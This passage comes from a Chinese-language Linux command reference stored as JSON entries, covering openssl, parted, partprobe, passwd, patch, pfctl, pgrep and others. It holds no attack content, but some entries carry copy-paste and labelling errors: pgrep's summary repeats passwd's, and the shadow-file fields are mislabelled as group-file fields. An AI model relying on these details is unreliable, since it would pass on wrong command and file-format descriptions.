tmp\n0000000 141 142 143\n0000003 144 145 146\n0000006 040 147 012\n0000011\n```\n\n说明：每行输出3个字节，并使用八进制单字节进行解释\n\n\n"},{"name":"openssl","categoryId":0,"data":"openssl\n\u003d\u003d\u003d\n\n强大的安全套接字层密码库\n\n## 补充说明\n\n**OpenSSL** 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。在OpenSSL被曝出现严重安全漏洞后，发现多数通过SSL协议加密的网站使用名为OpenSSL的开源软件包。由于这是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以该漏洞影响范围广大。\n\nOpenSSL有两种运行模式：交互模式和批处理模式。\n\n直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。\n\nOpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。 \n\n **对称加密算法** \n\nOpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。 \n\n **非对称加密算法** \n\nOpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用户密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。 \n\n **信息摘要算法** \n\nOpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。 \n\n **密钥和证书管理** \n\n密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。 \n\n首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 \n\n在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 \n\n事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。\n\n### 实例  \n\n **1、消息摘要算法应用例子** \n\n用SHA1算法计算文件file.txt的哈西值，输出到stdout：\n\n```\n# openssl dgst -sha1 file.txt\n```\n\n用SHA1算法计算文件file.txt的哈西值，输出到文件digest.txt：\n\n```\n# openssl sha1 -out digest.txt file.txt\n```\n\n用DSS1(SHA1)算法为文件file.txt签名，输出到文件dsasign.bin。签名的private key必须为DSA算法产生的，保存在文件dsakey.pem中。\n\n```\n# openssl dgst -dss1 -sign dsakey.pem -out dsasign.bin file.txt\n```\n\n用dss1算法验证file.txt的数字签名dsasign.bin，验证的private key为DSA算法产生的文件dsakey.pem。\n\n```\n# openssl dgst -dss1 -prverify dsakey.pem -signature dsasign.bin file.txt\n```\n\n用sha1算法为文件file.txt签名,输出到文件rsasign.bin，签名的private key为RSA算法产生的文件rsaprivate.pem。\n\n```\n# openssl sha1 -sign rsaprivate.pem -out rsasign.bin file.txt\n```\n\n# 用sha1算法验证file.txt的数字签名rsasign.bin，验证的public key为RSA算法生成的rsapublic.pem。\n\n```\n# openssl sha1 -verify rsapublic.pem -signature rsasign.bin file.txt\n```\n\n **2、对称加密应用例子** \n\n对称加密应用例子，用DES3算法的CBC模式加密文件plaintext.doc，加密结果输出到文件ciphertext.bin。\n\n```\n# openssl enc -des3 -salt -in plaintext.doc -out ciphertext.bin\n```\n\n用DES3算法的OFB模式解密文件ciphertext.bin，提供的口令为trousers，输出到文件plaintext.doc。注意：因为模式不同，该命令不能对以上的文件进行解密。\n\n```\n# openssl enc -des-ede3-ofb -d -in ciphertext.bin -out plaintext.doc -pass pass:trousers\n```\n\n用Blowfish的CFB模式加密plaintext.doc，口令从环境变量PASSWORD中取，输出到文件ciphertext.bin。\n\n```\n# openssl bf-cfb -salt -in plaintext.doc -out ciphertext.bin -pass env:PASSWORD\n```\n\n给文件ciphertext.bin用base64编码，输出到文件base64.txt。\n\n```\n# openssl base64 -in ciphertext.bin -out base64.txt\n```\n\n用RC5算法的CBC模式加密文件plaintext.doc，输出到文件ciphertext.bin，salt、key和初始化向量(iv)在命令行指定。\n\n```\n# openssl rc5 -in plaintext.doc -out ciphertext.bin -S C62CB1D49F158ADC -iv E9EDACA1BD7090C6 -K 89D4B1678D604FAA3DBFFD030A314B29\n```\n\n **3、Diffie-Hellman应用例子** \n\n使用生成因子2和随机的1024-bit的素数产生D0ffie-Hellman参数，输出保存到文件dhparam.pem\n\n```\n# openssl dhparam -out dhparam.pem -2 1024\n```\n\n从dhparam.pem中读取Diffie-Hell参数，以C代码的形式，输出到stdout。\n\n```\n# openssl dhparam -in dhparam.pem -noout -C\n```\n\n **4、DSA应用例子应用例子** \n\n生成1024位DSA参数集，并输出到文件dsaparam.pem。\n\n```\n# openssl dsaparam -out dsaparam.pem 1024\n```\n\n使用参数文件dsaparam.pem生成DSA私钥匙，采用3DES加密后输出到文件dsaprivatekey.pem\n\n```\n# openssl gendsa -out dsaprivatekey.pem -des3 dsaparam.pem\n```\n\n使用私钥匙dsaprivatekey.pem生成公钥匙，输出到dsapublickey.pem\n\n```\n# openssl dsa -in dsaprivatekey.pem -pubout -out dsapublickey.pem\n```\n\n从dsaprivatekey.pem中读取私钥匙，解密并输入新口令进行加密，然后写回文件dsaprivatekey.pem\n\n```\n# openssl dsa -in dsaprivatekey.pem -out dsaprivatekey.pem -des3 -passin\n```\n\n **5、RSA应用例子** \n\n产生1024位RSA私匙，用3DES加密它，口令为trousers，输出到文件rsaprivatekey.pem\n\n```\n# openssl genrsa -out rsaprivatekey.pem -passout pass:trousers -des3 1024\n```\n\n从文件rsaprivatekey.pem读取私匙，用口令trousers解密，生成的公钥匙输出到文件rsapublickey.pem\n\n```\n# openssl rsa -in rsaprivatekey.pem -passin pass:trousers -pubout -out rsapubckey.pem\n```\n\n用公钥匙rsapublickey.pem加密文件plain.txt，输出到文件cipher.txt\n\n```\n# openssl rsautl -encrypt -pubin -inkey rsapublickey.pem -in plain.txt -out cipher.txt\n```\n\n使用私钥匙rsaprivatekey.pem解密密文cipher.txt，输出到文件plain.txt\n\n```\n# openssl rsautl -decrypt -inkey rsaprivatekey.pem -in cipher.txt -out plain.txt\n```\n\n用私钥匙rsaprivatekey.pem给文件plain.txt签名，输出到文件signature.bin\n\n```\n# openssl rsautl -sign -inkey rsaprivatekey.pem -in plain.txt -out signature.bin\n```\n\n用公钥匙rsapublickey.pem验证签名signature.bin，输出到文件plain.txt\n\n```\n# openssl rsautl -verify -pubin -inkey rsapublickey.pem -in signature.bin -out plain\n```\n\n从X.509证书文件cert.pem中获取公钥匙，用3DES加密mail.txt，输出到文件mail.enc\n\n```\n# openssl smime -encrypt -in mail.txt -des3 -out mail.enc cert.pem\n```\n\n从X.509证书文件cert.pem中获取接收人的公钥匙，用私钥匙key.pem解密S/MIME消息mail.enc，结果输出到文件mail.txt\n\n```\n# openssl smime -decrypt -in mail.enc -recip cert.pem -inkey key.pem -out mail.txt\n```\n\ncert.pem为X.509证书文件，用私匙key,pem为mail.txt签名，证书被包含在S/MIME消息中，输出到文件mail.sgn\n\n```\n# openssl smime -sign -in mail.txt -signer cert.pem -inkey key.pem -out mail.sgn\n```\n\n验证S/MIME消息mail.sgn，输出到文件mail.txt，签名者的证书应该作为S/MIME消息的一部分包含在mail.sgn中\n\n```\n# openssl smime -verify -in mail.sgn -out mail.txt\n```\n\n\n"},{"name":"parted","categoryId":0,"data":"parted\n\u003d\u003d\u003d\n\n磁盘分区和分区大小调整工具\n\n## 补充说明\n\n**parted命令** 是由GNU组织开发的一款功能强大的磁盘分区和分区大小调整工具，与fdisk不同，它支持调整分区的大小。作为一种设计用于Linux的工具，它没有构建成处理与fdisk关联的多种分区类型，但是，它可以处理最常见的分区格式，包括：ext2、ext3、fat16、fat32、NTFS、ReiserFS、JFS、XFS、UFS、HFS以及Linux交换分区。\n\n### 语法  \n\n```\nparted(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n-i：交互式模式；\n-s：脚本模式，不提示用户；\n-v：显示版本号。\n```\n\n### 参数  \n\n*   设备：指定要分区的硬盘所对应的设备文件；\n*   命令：要执行的parted命令。\n\n### 实例  \n\n从串行技术出现以来，越来越多用户选择使用大容量的SATA硬盘创建磁盘阵列；特别是MD1000/MD3000，很轻易就突破2T的LUN，故在此给大家一些指引。\n\n红帽企业 Linux 4 Update 4供对大于 2 terabytes（TB）的磁盘设备的支持。\n\n请参考以下操作步骤：\n\n注：\n\n*   绿色代表你需要使用的命令。\n*   红色代表你需要注意到的输出信息，在后续需要使用。\n\n```\n[root@localhost ~]# fdisk -l\nDisk /dev/sda: 35.8 GB, 35862976512 bytes\n255 heads, 63 sectors/track, 4360 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n   Device Boot      Start         End      Blocks   id  System\n/dev/sda1   *           1          13      104391   83  Linux\n/dev/sda2              14         144     1052257+  82  Linux swap\n/dev/sda3             145        4360    33865020   83  Linux\nDisk /dev/sdb: 2147 MB, 2147483648 bytes\n255 heads, 63 sectors/track, 261 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\nDisk /dev/sdb doesn\u0027t contain a valid partition table\n```\n\n```\n[root@localhost ~]# parted /dev/sdb\nGNU Parted Copyright (C) 1998 - 2004 free Software Foundation, Inc.\nThis program is free software, covered by the GNU General Public License.\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY\nWARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.  See the GNU General Public License for more details.\n使用/dev/sdb\n(parted)mklabel gpt\n(parted)print\n/dev/sdb的磁盘几何结构：0.000-2048.000兆字节\n磁盘标签类型：gpt\nMinor   起始点       终止点 文件系统   名称                 标志\n(parted)mkpart primary 0 2048  \u003c-----上面print显示的数字\n(parted)print\n/dev/sdb的磁盘几何结构：0.000-2048.000兆字节\n磁盘标签类型：gpt\nMinor   起始点       终止点 文件系统   名称                 标志\n1          0.017   2047.983\n(parted)quit\n\n```\n\n如果必要，不要忘记更新`/etc/fstab`。\n\n```\n[root@localhost ~]# fdisk -l\nDisk /dev/sda: 35.8 GB, 35862976512 bytes\n255 heads, 63 sectors/track, 4360 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sda1   *           1          13      104391   83  Linux\n/dev/sda2              14         144     1052257+  82  Linux swap\n/dev/sda3             145        4360    33865020   83  Linux\nWARNING: GPT (GUID Partition Table) detected on \u0027/dev/sdb\u0027! The util fdisk doesn\u0027t support GPT. Use GNU Parted.\n\nDisk /dev/sdb: 2147 MB, 2147483648 bytes\n255 heads, 63 sectors/track, 261 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         262     2097151+  ee  EFI GPT\nPartition 1 has different physical/logical beginnings (non-Linux?):\n     phys\u003d(0, 0, 1) logical\u003d(0,0, 2)\nPartition 1 has different physical/logical endings:\n     phys\u003d(1023, 254, 63) logical\u003d(261, 21, 16)\n```\n\n```\n[root@localhost ~]# mkfs.ext3 /dev/sdb1\nmke2fs 1.35 (28-Feb-2004)\nFilesystem label\u003d\nOS type: Linux\nBlock size\u003d4096 (log\u003d2)\nFragment size\u003d4096 (log\u003d2)\n262144 inodes, 524279 blocks\n26213 blocks (5.00%) reserved for the super user\nFirst data block\u003d0\nMaximum filesystem blocks\u003d536870912\n16 block groups\n32768 blocks per group, 32768 fragments per group\n16384 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912\nWriting inode tables: done\nCreating journal (8192 blocks): done\nWriting superblocks and filesystem accounting information: done\nThis filesystem will be automatically checked every 28 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n```\n\n```\n[root@localhost ~]# mount /dev/sdb1 /mnt\n[root@localhost ~]# df -h\nFilesystem            容量  已用 可用 已用% 挂载点\n/dev/sda3              \u003c?xml:namespace prefix \u003d st1 /\u003e32G  2.6G   28G   9% /\n/dev/sda1              99M   12M   82M  13% /boot\nnone                  252M     0  252M   0% /dev/shm\n/dev/sdb1             2.0G   36M  1.9G   2% /mnt\n```\n\n\n"},{"name":"partprobe","categoryId":0,"data":"partprobe\n\u003d\u003d\u003d\n\n不重启的情况下重读分区\n\n## 补充说明\n\n**partprobe命令** 用于重读分区表，当出现删除文件后，出现仍然占用空间。可以partprobe在不重启的情况下重读分区。\n\n### 语法  \n\n```\npartprobe(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：不更新内核；\n-s：显示摘要和分区；\n-h：显示帮助信息；\n-v：显示版本信息。\n```\n\n### 参数  \n\n设备：指定需要确认分区表改变的硬盘对应的设备文件。\n\n### 实例  \n\n使用partprobe不重启系统添加新的磁盘分区，主机自带硬盘超过300GB，目前只划分使用了3个主分区，不到70GB，如下：\n\n```\n[root@localhost ~]# df -h \nFilesystem Size Used Avail Use% Mounted on \n/dev/sda1 29G 3.7G  24G 14% / \n/dev/sda2 29G  22G 5.2G 81% /oracle \ntmpfs    2.0G    0 2.0G  0% /dev/shm\n```\n\n```\n[root@localhost ~]# cat /proc/partitions\nmajor minor  #blocks  name\n\n   8     0  311427072 sda\n   8     1   30716248 sda1\n   8     2   30716280 sda2\n   8     3    8193150 sda3\n   8    16     976896 sdb\n   8    32     976896 sdc\n\n…省略其他\n\n```\n\n现在需要给系统添加1个100GB的空间存放数据文件，而又不影响现有系统上业务的运行，使用fdisk结合partprobe命令不重启系统添加一块新的磁盘分区。操作步骤如下：\n\n **第1步 添加新的磁盘分区** ：\n\n```\n[root@localhost ~]# fdisk /dev/sda\nThe number of cylinders for this disk is set to 38770.\nThere is nothing wrong with that, but this is larger than 1024,\nand could in certain setups cause problems with:\n1) software that runs at boot time (e.g., old versions of lilo)\n2) booting and partitioning software from other OSs\n   (e.g., DOS FDISK, OS/2 FDISK)\n\ncommand (m for help): p\n\nDisk /dev/sda: 318.9 GB, 318901321728 bytes\n255 heads, 63 sectors/track, 38770 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   id  System\n/dev/sda1   *           1        3824    30716248+  83  Linux\n/dev/sda2            3825        7648    30716280   83  Linux\n/dev/sda3            7649        8668     8193150   82  Linux swap / Solaris\n\nCommand (m for help): n\nCommand action\n   e   extended\n   p   primary partition (1-4)\np\nSelected partition 4\nFirst cylinder (8669-38770, default 8669):\nUsing default value 8669\nlast cylinder or +size or +sizeM or +sizeK (8669-38770, default 38770): +100G   \nCommand (m for help): w\nThe partition table has been altered!\n\nCalling ioctl() to re-read partition table.\n\nWARNING: Re-reading the partition table failed with error 16: \n\nDevice or resource busy.\nThe kernel still uses the old table.\nThe new table will be used at the next reboot.\nSyncing disks.\n```\n\n **第2步 使用工具partprobe让kernel读取分区信息：** \n\n```\n[root@localhost ~]# partprobe\n```\n\n使用fdisk工具只是将分区信息写到磁盘，如果需要mkfs磁盘分区则需要重启系统，而使用partprobe则可以使kernel重新读取分区信息，从而避免重启系统。\n\n **第3步 格式化文件系统：** \n\n```\n[root@localhost ~]# mkfs.ext3 /dev/sda4\nmke2fs 1.39 (29-May-2006)\nFilesystem label\u003d\nOS type: Linux\nBlock size\u003d4096 (log\u003d2)\nFragment size\u003d4096 (log\u003d2)\n12222464 inodes, 24416791 blocks\n1220839 blocks (5.00%) reserved for the super user\nFirst data block\u003d0\nMaximum filesystem blocks\u003d4294967296\n746 block groups\n32768 blocks per group, 32768 fragments per group\n16384 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, \n　　　　2654208, 4096000, 7962624, 11239424, 20480000, 23887872\n\nWriting inode tables: done\nCreating journal (32768 blocks): done\nWriting superblocks and filesystem accounting information:\n\ndone\n\nThis filesystem will be automatically checked every 26 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n[root@localhost ~]#\n```\n\n **第4步 mount新的分区`/dev/sda4`：** \n\n```\n[root@localhost ~]# e2label  /dev/sda4 /data\n[root@localhost ~]# mkdir /data\n[root@localhost ~]# mount /dev/sda4 /data\n[root@localhost ~]# df\nFilesystem           1K-blocks      Used Available Use% Mounted on\n/dev/sda1             29753556   3810844  24406900  14% /\n/dev/sda2             29753588  11304616  16913160  41% /oracle\ntmpfs                  2023936         0   2023936   0% /dev/shm\n/dev/sda4             96132968    192312  91057300   1% /data\n```\n\n使用partprobe可以不用重启系统即可配合fdisk工具创建新的分区。\n\n\n"},{"name":"passwd","categoryId":4,"data":"passwd\n\u003d\u003d\u003d\n\n用于让用户可以更改自己的密码\n\n## 补充说明\n\n**passwd命令** 用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。\n\n### 语法  \n\n```\npasswd(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：删除密码，仅有系统管理者才能使用；\n-f：强制执行；\n-k：设置只有在密码过期失效后，方能更新；\n-l：锁住密码；\n-s：列出密码的相关信息，仅有系统管理者才能使用；\n-u：解开已上锁的帐号。\n```\n\n### 参数  \n\n用户名：需要设置密码的用户名。\n\n### 知识扩展  \n\n与用户、组账户信息相关的文件\n\n存放用户信息：\n\n```\n/etc/passwd\n/etc/shadow\n```\n\n存放组信息：\n\n```\n/etc/group\n/etc/gshadow\n```\n\n用户信息文件分析（每项用`:`隔开）\n\n```\n例如：jack:X:503:504:::/home/jack/:/bin/bash\njack　　//用户名\nX　　//口令、密码\n503　　//用户id（0代表root、普通新建用户从500开始）\n504　　//所在组\n:　　//描述\n/home/jack/　　//用户主目录\n/bin/bash　　//用户缺省Shell\n```\n\n组信息文件分析\n\n```\n例如：jack:$!$:???:13801:0:99999:7:*:*:\njack　　//组名\n$!$　　//被加密的口令\n13801　　//创建日期与今天相隔的天数\n0　　//口令最短位数\n99999　　//用户口令\n7　　//到7天时提醒\n*　　//禁用天数\n*　　//过期天数\n```\n\n### 实例  \n\n如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。\n\n```\n[root@localhost ~]# passwd linuxde    //更改或创建linuxde用户的密码；\nChanging password for user linuxde.\nNew UNIX password:          //请输入新密码；\nRetype new UNIX password:   //再输入一次；\npasswd: all authentication tokens updated successfully. //成功；\n```\n\n普通用户如果想更改自己的密码，直接运行passwd即可，比如当前操作的用户是linuxde。\n\n```\n[linuxde@localhost ~]$ passwd\nChanging password for user linuxde. //更改linuxde用户的密码；\n(current) UNIX password:   //请输入当前密码；\nNew UNIX password:         //请输入新密码；\nRetype new UNIX password:  //确认新密码；\npasswd: all authentication tokens updated successfully. //更改成功；\n```\n\n比如我们让某个用户不能修改密码，可以用`-l`选项来锁定：\n\n```\n[root@localhost ~]# passwd -l linuxde    //锁定用户linuxde不能更改密码；\nLocking password for user linuxde.\npasswd: Success           //锁定成功；\n\n[linuxde@localhost ~]# su linuxde   //通过su切换到linuxde用户；\n[linuxde@localhost ~]$ passwd      //linuxde来更改密码；\nChanging password for user linuxde.\nChanging password for linuxde\n(current) UNIX password:          //输入linuxde的当前密码；\npasswd: Authentication token manipulation error     //失败，不能更改密码；\n```\n\n再来一例：\n\n```\n[root@localhost ~]# passwd -d linuxde  //清除linuxde用户密码；\nRemoving password for user linuxde.\npasswd: Success                         //清除成功；\n\n[root@localhost ~]# passwd -S linuxde    //查询linuxde用户密码状态；\nEmpty password.                         //空密码，也就是没有密码；\n```\n\n注意：当我们清除一个用户的密码时，登录时就无需密码，这一点要加以注意。\n\n\n"},{"name":"paste","categoryId":6,"data":"paste\n\u003d\u003d\u003d\n\n将多个文件按列队列合并\n\n## 补充说明\n\n**paste命令** 用于将多个文件按照列队列进行合并。\n\n### 语法  \n\n```\npaste(选项)(参数)\n```\n\n### 选项  \n\n```\n-d\u003c间隔字符\u003e或--delimiters\u003d\u003c间隔字符\u003e：用指定的间隔字符取代跳格字符；\n-s或——serial串列进行而非平行处理。\n```\n\n### 参数  \n\n文件列表：指定需要合并的文件列表。\n\n\n"},{"name":"patch","categoryId":6,"data":"patch\n\u003d\u003d\u003d\n\n为开放源代码软件安装补丁程序\n\n## 补充说明\n\n**patch命令** 被用于为开放源代码软件安装补丁程序。让用户利用设置修补文件的方式，修改，更新原始文件。如果一次仅修改一个文件，可直接在命令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。\n\n### 语法  \n\n```\npatch(选项)(参数)\n```\n\n### 选项  \n\n```\n-b或--backup：备份每一个原始文件；\n-B\u003c备份字首字符串\u003e或--prefix\u003d\u003c备份字首字符串\u003e：设置文件备份时，附加在文件名称前面的字首字符串，该字符串可以是路径名称；\n-c或--context：把修补数据解译成关联性的差异；\n-d\u003c工作目录\u003e或--directory\u003d\u003c工作目录\u003e：设置工作目录；\n-D\u003c标示符号\u003e或--ifdef\u003d\u003c标示符号\u003e：用指定的符号把改变的地方标示出来；\n-e或--ed：把修补数据解译成ed指令可用的叙述文件；\n-E或--remove-empty-files：若修补过后输出的文件其内容是一片空白，则移除该文件；\n-f或--force：此参数的效果和指定\"-t\"参数类似，但会假设修补数据的版本为新版本；\n-F\u003c监别列数\u003e或--fuzz\u003c监别列数\u003e：设置监别列数的最大值；\n-g\u003c控制数值\u003e或--get\u003d\u003c控制数值\u003e：设置以RSC或SCCS控制修补作业；\n-i\u003c修补文件\u003e或--input\u003d\u003c修补文件\u003e：读取指定的修补问家你；\n-l或--ignore-whitespace：忽略修补数据与输入数据的跳格，空格字符；\n-n或--normal：把修补数据解译成一般性的差异；\n-N或--forward：忽略修补的数据较原始文件的版本更旧，或该版本的修补数据已使 用过；\n-o\u003c输出文件\u003e或--output\u003d\u003c输出文件\u003e：设置输出文件的名称，修补过的文件会以该名称存放；\n-p\u003c剥离层级\u003e或--strip\u003d\u003c剥离层级\u003e：设置欲剥离几层路径名称；\n-f\u003c拒绝文件\u003e或--reject-file\u003d\u003c拒绝文件\u003e：设置保存拒绝修补相关信息的文件名称，预设的文件名称为.rej；\n-R或--reverse：假设修补数据是由新旧文件交换位置而产生；\n-s或--quiet或--silent：不显示指令执行过程，除非发生错误；\n-t或--batch：自动略过错误，不询问任何问题；\n-T或--set-time：此参数的效果和指定\"-Z\"参数类似，但以本地时间为主；\n-u或--unified：把修补数据解译成一致化的差异；\n-v或--version：显示版本信息；\n-V\u003c备份方式\u003e或--version-control\u003d\u003c备份方式\u003e：用\"-b\"参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用\"-z\"参数变更，当使用\"-V\"参数指定不同备份方式时，也会产生不同字尾的备份字符串；\n-Y\u003c备份字首字符串\u003e或--basename-prefix\u003d--\u003c备份字首字符串\u003e：设置文件备份时，附加在文件基本名称开头的字首字符串；\n-z\u003c备份字尾字符串\u003e或--suffix\u003d\u003c备份字尾字符串\u003e：此参数的效果和指定\"-B\"参数类似，差别在于修补作业使用的路径与文件名若为src/linux/fs/super.c，加上\"backup/\"字符串后，文件super.c会备份于/src/linux/fs/backup目录里；\n-Z或--set-utc：把修补过的文件更改，存取时间设为UTC；\n--backup-if-mismatch：在修补数据不完全吻合，且没有刻意指定要备份文件时，才备份文件；\n--binary：以二进制模式读写数据，而不通过标准输出设备；\n--help：在线帮助；\n--nobackup-if-mismatch：在修补数据不完全吻合，且没有刻意指定要备份文件时，不要备份文件；\n--verbose：详细显示指令的执行过程。\n```\n\n### 参数  \n\n*   原文件：指定需要打补丁的原始文件；\n*   补丁文件：指定补丁文件。\n\n\n"},{"name":"pathchk","categoryId":0,"data":"pathchk\n\u003d\u003d\u003d\n\n检查文件中不可移植的部分\n\n## 补充说明\n\n**pathchk命令** 用来检查文件中不可移植的部分。\n\n### 语法  \n\n```\npathchk(选项)(参数)\n```\n\n### 选项  \n\n```\n-p：检查大多数的POSIX系统；\n-P：检查空名字和“-”开头的文件；\n--portability：检查所有的POSIX系统，等同于“-P-p”选项；\n--help：显示帮助；\n--wersion：显示版本号。\n```\n\n### 参数  \n\n*   文件：带路径信息的文件；\n*   后缀：可选参数，指定要去除的文件后缀字符串。\n\n\n"},{"name":"perl","categoryId":0,"data":"perl\n\u003d\u003d\u003d\n\nperl语言解释器\n\n## 补充说明\n\n**perl命令** 是perl语言解释器，负责解释执行perl语言程序。\n\n### 语法  \n\n```\nperl(选项)(参数)\n```\n\n### 选项  \n\n```\n-w：输出有用的警告信息；\n-U：允许不安全的操作；\n-c：仅检查文件的语法；\n-d：在调试下运行脚本程序。\n```\n\n### 参数  \n\n文件：要运行的perl脚本程序。\n\n\n"},{"name":"pfctl","categoryId":0,"data":"pfctl\n\u003d\u003d\u003d\n\nPF防火墙的配置命令\n\n## 补充说明\n\n**pfctl命令** 是PF防火墙的配置命令，PF防火墙( 全称：Packet Filter )是UNIX LIKE系统上进行TCP/ip流量过滤和网络地址转换的软件系统。PF同样也能提供TCP/IP流量的整形和控制，并且提供带宽控制和数据包优先集控制。PF最早是由Daniel Hartmeier开发的，现在的开发和维护由Daniel和openBSD小组的其他成员负责。\n\nPF防火墙的功能很多，本站只列举一些基本配置。\n\n### 激活  \n\n要激活pf并且使它在启动时调用配置文件，编辑`/etc/rc.conf`文件，修改配置pf的一行：\n\n```\npf\u003dyes\n```\n\n重启操作系统让配置生效。\n\n也可以通过pfctl程序启动和停止pf：\n\n```\n# pfctl -e\n# pfctl -d\n```\n\n注意这仅仅是启动和关闭PF，实际它不会载入规则集，规则集要么在系统启动时载入，要在PF启动后通过命令单独载入。\n\n### 配置  \n\n系统引导到在rc脚本文件运行PF时PF从`/etc/pf.conf`文件载入配置规则。注意当`/etc/pf.conf`文件是默认配置文件，在系统调用rc脚本文件时，它仅仅是作为文本文件由pfctl装入并解释和插入pf的。对于一些应用来说，其他的规则集可以在系统引导后由其他文件载入。对于一些设计的非常好的unix程序，PF提供了足够的灵活性。\n\n **pf.conf文件有7个部分：** \n\n1.  宏：用户定义的变量，包括IP地址，接口名称等等。\n2.  表：一种用来保存IP地址列表的结构。\n3.  选项：控制PF如何工作的变量。\n4.  整形：重新处理数据包，进行正常化和碎片整理。\n5.  排队：提供带宽控制和数据包优先级控制。\n6.  转换：控制网络地址转换和数据包重定向。\n7.  过滤规则：在数据包通过接口时允许进行选择性的过滤和阻止。\n\n除去宏和表，其他的段在配置文件中也应该按照这个顺序出现，尽管对于一些特定的应用并不是所有的段都是必须的。\n\n空行会被忽略，以#开头的行被认为是注释。\n\n### 控制  \n\n引导之后，PF可以通过pfctl程序进行操作，以下是一些例子：\n\n```\n# pfctl -f /etc/pf.conf  载入 pf.conf 文件\n# pfctl -nf /etc/pf.conf 解析文件，但不载入\n# pfctl -Nf /etc/pf.conf 只载入文件中的NAT规则\n# pfctl -Rf /etc/pf.conf 只载入文件中的过滤规则\n\n# pfctl -sn 显示当前的NAT规则\n# pfctl -sr 显示当前的过滤规则\n# pfctl -ss 显示当前的状态表\n# pfctl -si 显示过滤状态和计数\n# pfctl -sa 显示任何可显示的\n```\n\n完整的命令列表，请参阅pfctl的man手册页。\n\n\n"},{"name":"pgrep","categoryId":0,"data":"pgrep\n\u003d\u003d\u003d\n\n设置用户的认证信息，包括用户密码、密码过期时间等\n\n## 补充说明\n\n**pgrep命令** 以名称为依据从运行进程队列中查找进程，并显示查找到的进程id。每一个进程ID以一个十进制数表示，通过一个分割字符串和下一个ID分开，默认的分割字符串是一个新行。对于每个属性选项，用户可以在命令行上指定一个以逗号分割的可能值的集合。\n\n### 语法  \n\n```\npgrep(选项)(参数)\n```\n\n### 选项  \n\n```\n-o：仅显示找到的最小（起始）进程号；\n-n：仅显示找到的最大（结束）进程号；\n-l：显示进程名称；\n-P：指定父进程号；\n-g：指定进程组；\n-t：指定开启进程的终端；\n-u：指定进程的有效用户ID。\n```\n\n### 参数  \n\n进程名称：指定要查找的进程名称，同时也支持类似grep指令中的匹配模式。\n\n### 实例  \n\n```\npgrep -lo httpd\n4557 httpd\n [root@localhost ~]# pgrep -ln httpd\n4566 httpd\n\n[root@localhost ~]# pgrep -l httpd\n4557 httpd\n4560 httpd\n4561 httpd\n4562 httpd\n4563 httpd\n4564 httpd\n4565 httpd\n4566 httpd\n\n[root@localhost ~]# pgrep httpd 4557\n4560\n4561\n4562\n4563\n4564\n4565\n4566\n```\n\n\n"},{"name":"php","categoryId":0,"data":"php\n\u003d\u003d\u003d\n\nPHP语言的命令行接口\n\n## 补充说明\n\n**php命令** 是流行的Web开发语言PHP的命令行接口，可以使用PHP语言开发基于命令行的系统管理脚本程序。\n\n### 语法  